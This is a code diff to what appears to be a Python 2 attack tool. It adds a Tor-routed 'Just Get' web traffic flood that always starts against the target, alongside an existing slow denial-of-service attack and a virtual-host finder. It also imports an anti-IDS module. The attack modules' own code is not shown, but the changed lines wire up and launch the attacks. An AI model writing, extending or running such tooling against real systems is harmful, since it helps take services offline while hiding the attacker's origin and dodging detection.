@@ -37,7 +37,7 @@
     condition.    
 """
 from datetime import datetime, timedelta
-from libs import AntiIDS, SocketController, funcs, httplib2, slow_ddos_tor
+from libs import AntiIDS, SocketController, funcs, httplib2, slow_ddos_tor, web_traffic_tor
 from vars import vhost_finder_vars
 from random import choice, shuffle
 from string import digits, letters
@@ -350,7 +350,14 @@ def setOffSlowDos(host="", port=""):
     slowdospid = os.getpid()
     print "\n\n" +  name + " Started with pid %d" % slowdospid
     slow_ddos_tor.kickOff(host=host, port=port, plist=sc.getPortList())
-    print name + " Finished"
+    print name + " Finished - %s" % name
+    
+def setOffGets(host="", port=""):
+    name = multiprocessing.current_process().name
+    webtrafficpid = os.getpid()
+    print "\n\n" +  name + " Started with pid %d" % webtrafficpid
+    web_traffic_tor.kickOff(host=host, port=port, plist=sc.getPortList())
+    print name + " Finished - %s" % name
 
 if __name__ == "__main__":
     start = time.time()
@@ -364,6 +371,9 @@ if __name__ == "__main__":
     if slowdos:
         worker_slowDos = multiprocessing.Process(name='Slow Dos Attack', target=setOffSlowDos, args=(tip,tport))
         worker_slowDos.start()
+        
+    worker_Get = multiprocessing.Process(name='Just Get', target=setOffGets, args=(tip,tport))
+    worker_Get.start()
     
     worker_vHostFind = multiprocessing.Process(name='VHost Finder', target=setItOff, args=(tip,tport,tdomain,ttld))
     worker_vHostFind.start()
